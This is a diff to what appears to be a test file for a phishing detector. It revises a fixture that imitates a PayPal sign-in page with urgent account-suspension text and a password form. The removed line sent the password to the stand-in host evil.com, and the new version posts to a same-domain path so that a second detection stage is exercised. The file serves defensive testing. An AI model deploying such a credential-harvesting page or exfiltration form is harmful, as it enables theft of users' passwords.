@@ -22,8 +22,11 @@ HTML_PHISHING = """
 </body></html>
 """
 
-# Triggers enough Stage A signals (sensitive_fields + brand_domain_mismatch +
-# external_form_action) to land in the ambiguous band so Stage B runs.
+# Triggers brand_domain_mismatch (PayPal title on a non-paypal host) but keeps
+# the form action same-domain, so the deterministic score stays below the block
+# threshold and lands in the ambiguous band — Stage B's phishing_language signal
+# is what must escalate it. (An external form action would let Stage A block it
+# outright and never exercise the Stage B path this test is checking.)
 HTML_PHISHING_AMBIGUOUS = """
 <html><head><title>PayPal Sign In - Security alert</title></head>
 <body>
@@ -31,7 +34,7 @@ HTML_PHISHING_AMBIGUOUS = """
   <p>Your account is suspended due to unusual sign-in activity.
      Please verify your account and re-enter your password within 24 hours
      to avoid losing access. Click the link below to confirm your identity.</p>
-  <form action="https://evil.com/collect" method="post">
+  <form action="/collect" method="post">
     <input type="password" name="password">
   </form>
 </body></html>
